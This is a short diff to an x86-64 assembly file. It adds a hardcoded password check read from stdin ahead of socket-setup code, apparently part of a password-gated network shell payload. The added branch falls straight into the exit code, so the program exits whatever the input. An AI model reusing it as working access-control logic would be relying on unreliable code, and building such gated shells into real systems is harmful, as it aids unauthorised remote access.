@@ -2,6 +2,31 @@ global _start
 
 %define _START
 _start:
+    jmp real_start
+    password: db "pass"
+    pass_len: db $-password
+
+real_start:
+
+    mov rax, 0
+    mov rdi, 0    ; fd
+    sub rsp, 16   ; create space for "buf" in the stack
+    mov rsi, rsp  ; rsi = *buf
+    mov rdx, 16
+    syscall
+
+    ; compare password
+    xor rcx, rcx
+    mov cl, [rel pass_len]
+    lea rdi, [rel password]
+    cld
+    repz cmpsb
+    jne exit
+
+exit:
+    mov rax, 60
+    syscall
+
 
     ; sock = socket(AF_INET, SOCK_STREAM, 0)
     ; AF_INET = 2
